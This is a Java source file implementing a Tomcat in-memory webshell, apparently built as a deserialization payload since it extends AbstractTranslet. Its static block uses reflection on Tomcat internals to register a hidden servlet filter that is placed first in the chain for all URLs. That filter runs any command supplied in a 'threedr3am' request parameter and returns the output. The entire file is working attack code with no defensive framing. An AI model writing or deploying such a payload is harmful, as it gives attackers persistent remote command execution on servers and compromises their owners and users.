import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.IOException;
import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;

/**
 * 基于tomcat的内存Webshell
 *
 * @author threedr3am
 */
public class TomcatShellInject extends AbstractTranslet implements Filter {

  static {
    try {
      /*shell注入，前提需要能拿到request、response等*/
      java.lang.reflect.Field f = org.apache.catalina.core.ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
      f.setAccessible(true);
      java.lang.ThreadLocal t = (java.lang.ThreadLocal) f.get(null);
      //不为空则意味着第一次反序列化的准备工作已成功
      if (t != null && t.get() != null) {
        javax.servlet.ServletRequest servletRequest = (javax.servlet.ServletRequest) t.get();
        javax.servlet.ServletContext servletContext = servletRequest.getServletContext();
        org.apache.catalina.core.StandardContext standardContext = null;
        //判断是否已有该名字的filter，有则不再添加
        if (servletContext.getFilterRegistration("threedr3am") == null) {
          //遍历出标准上下文对象
          for (; standardContext == null; ) {
            java.lang.reflect.Field contextField = servletContext.getClass().getDeclaredField("context");
            contextField.setAccessible(true);
            Object o = contextField.get(servletContext);
            if (o instanceof javax.servlet.ServletContext) {
              servletContext = (javax.servlet.ServletContext) o;
            } else if (o instanceof org.apache.catalina.core.StandardContext) {
              standardContext = (org.apache.catalina.core.StandardContext) o;
            }
          }
          if (standardContext != null) {
            //修改状态，要不然添加不了
            java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase.class.getDeclaredField("state");
            stateField.setAccessible(true);
            stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);
            //创建一个自定义的Filter马
            javax.servlet.Filter threedr3am = new TomcatShellInject();
            //添加filter马
            javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext
                .addFilter("threedr3am", threedr3am);
            filterRegistration.setInitParameter("encoding", "utf-8");
            filterRegistration.setAsyncSupported(false);
            filterRegistration
                .addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false,
                    new String[]{"/*"});
            //状态恢复，要不然服务不可用
            if (stateField != null) {
              stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);
            }

            if (standardContext != null) {
              //生效filter
              java.lang.reflect.Method filterStartMethod = org.apache.catalina.core.StandardContext.class.getMethod("filterStart");
              filterStartMethod.setAccessible(true);
              filterStartMethod.invoke(standardContext, null);

              //把filter插到第一位
              org.apache.tomcat.util.descriptor.web.FilterMap[] filterMaps = standardContext.findFilterMaps();
              for (int i = 0; i < filterMaps.length; i++) {
                if (filterMaps[i].getFilterName().equalsIgnoreCase("threedr3am")) {
                  org.apache.tomcat.util.descriptor.web.FilterMap filterMap = filterMaps[i];
                  filterMaps[i] = filterMaps[0];
                  filterMaps[0] = filterMap;
                  break;
                }
              }
            }
          }
        }
      }
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  @Override
  public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

  }

  @Override
  public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
      throws TransletException {

  }

  @Override
  public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse,
      FilterChain filterChain) throws IOException, ServletException {
    System.out.println("TomcatShellInject.Threedr3amFilter doFilter.....................................................................");
    String cmd;
    if ((cmd = servletRequest.getParameter("threedr3am")) != null) {
      Process process = Runtime.getRuntime().exec(cmd);
      java.io.BufferedReader bufferedReader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));
      StringBuilder stringBuilder = new StringBuilder();
      String line;
      while ((line = bufferedReader.readLine()) != null)
        stringBuilder.append(line + '\n');
      servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
      servletResponse.getOutputStream().flush();
      servletResponse.getOutputStream().close();
      return;
    }
    filterChain.doFilter(servletRequest, servletResponse);
  }
}
